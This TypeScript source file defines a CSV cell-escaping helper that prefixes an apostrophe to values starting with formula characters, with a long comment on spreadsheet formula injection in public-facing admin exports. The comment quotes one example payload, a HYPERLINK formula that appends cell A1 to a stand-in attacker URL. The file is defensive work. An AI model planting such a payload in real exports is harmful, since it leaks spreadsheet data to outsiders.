/**
 * Turns a value into one CSV cell that a spreadsheet will read as TEXT.
 *
 * ── Two separate problems, only one of which quoting solves ──────────────────
 *
 * Wrapping in quotes and doubling any inner quote makes the cell well-formed
 * CSV — commas, quotes and newlines survive the round trip. That is what the
 * three exports (scholarship, tenders, good conduct) each did with their own
 * copy of the same one-liner, and it is correct as far as it goes.
 *
 * It does nothing about the second problem. Excel, LibreOffice and Google
 * Sheets treat a cell whose text begins with `=`, `+`, `-` or `@` as a FORMULA,
 * and the CSV quotes are consumed as quoting rather than kept as content — so
 *
 *     "=HYPERLINK(""https://evil.example/""&A1,""CLICK"")"
 *
 * arrives as a live formula, not as the characters an applicant typed. The
 * fields these exports carry — `fullNames`, `schoolName`, a company name, a
 * bid — are supplied by the public and validated only for length. The person
 * who opens the file is an RMC administrator, on an admin machine.
 *
 * ── The fix, and why this one ────────────────────────────────────────────────
 *
 * A leading apostrophe is the interoperable way to force text: every major
 * spreadsheet honours it, and it is not shown in the cell. Stripping or
 * rejecting the character instead would corrupt legitimate values — a bid of
 * `-500`, or a note that genuinely opens with `@`.
 *
 * The tab and carriage-return cases matter for the same reason: a leading tab
 * is trimmed by some importers, which uncovers a `=` sitting behind it.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

export function escapeCsvCell(value: unknown): string {
  const text = String(value ?? '');
  // Prefixed BEFORE quoting, so the apostrophe is inside the quoted cell and is
  // what the spreadsheet sees first.
  const safe = FORMULA_LEAD.test(text) ? `'${text}` : text;
  return `"${safe.replace(/"/g, '""')}"`;
}

/** One CSV document: a header row plus body rows, every cell escaped. */
export function toCsv(header: string[], rows: unknown[][]): string {
  return [
    header.map(escapeCsvCell).join(','),
    ...rows.map((row) => row.map(escapeCsvCell).join(',')),
  ].join('\n');
}
